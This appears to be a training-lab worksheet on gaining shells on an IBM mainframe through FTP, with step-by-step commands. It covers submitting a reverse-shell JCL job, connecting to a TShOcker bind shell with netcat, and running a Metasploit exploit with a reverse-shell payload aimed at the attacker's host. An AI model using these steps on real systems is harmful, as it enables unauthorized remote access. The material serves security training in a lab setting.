FTP SHELLS Three ways:

1) Your own JCL 
- Connect with FTP and download REVUSSC (or skip this and look in folder Extra/Shells)
- Logon with FTP
- cd in to the 'LABS' folder: cd LABS
- Downoad USSREVC: get USSREVC ussrevc.jcl
- Using whatever editor you like change the port to 443:
  - on line 28 replace: sin.sin_port=htons(31337); with sin.sin_port=htons(443);
- Using NetEBCDICat.py open a listener on port 443 (in a seperate window)
- Now reconnect with FTP. After loging on type:
  - site file=jes
  - put ussrevc.jcl
- You should eventually see a connection back in to NetEBCDICat.py
- CONGRATS! You got a shell through FTP!

2) Using TShOcker:
- Using the tool TShOcker issue the command: 
      ./TShOcker.py -l --lport <pick some port above 10224> <mainframe ip> <userid> <password>
- In your Lab VM connect to the mainframe with netcat: nc -v <mainframe ip> <some port you picked>
- Issue some commands
- STICKER: What is the location of the RACF database (as told to you by this limited shell)

3) Using Metasploit:
- Launch metasploit: msfconsole
- Use the FTP Creds exploit: use exploit/mainframe/ftp/ftp_jcl_creds
- Set the payload to reverse shell: set payload cmd/mainframe/reverse_shell_jcl
- Set FTPUSER and FTPPASS to your username and password: 
  - set FTPUSER <userid>
  - set FTPPASS <password>
- Set RHOST to the mainframe ip: set RHOST <mainframe ip>
- Set your host: set LHOST <your machine ip address>
- Then run the exploit: run
- Notice that this is a UNIX shell
